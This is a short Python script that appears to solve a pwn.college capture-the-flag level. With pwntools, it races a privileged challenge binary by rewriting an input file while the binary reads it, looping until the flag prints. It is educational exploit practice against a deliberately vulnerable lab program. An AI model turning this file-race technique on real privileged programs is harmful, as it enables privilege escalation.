# Level3
import os

import pwn
from dojotool import find_challenge


def ctf() -> None:
    root_bin = find_challenge()
    fake_file = "/home/hacker/f"
    while True:
        f = open(fake_file, "wb")
        f.write(b"A" * 256)
        f.flush()
        with pwn.process([root_bin, fake_file], raw=True, level="error") as io:
            # io.sendline()
            f.write(pwn.p64(1))
            f.flush()
            # io.sendline()
            data = io.recvrepeat().decode(errors="ignore")
            if "pwn.college{" in data:
                print(data)
                break
    os.unlink(fake_file)


if __name__ == "__main__":
    ctf()
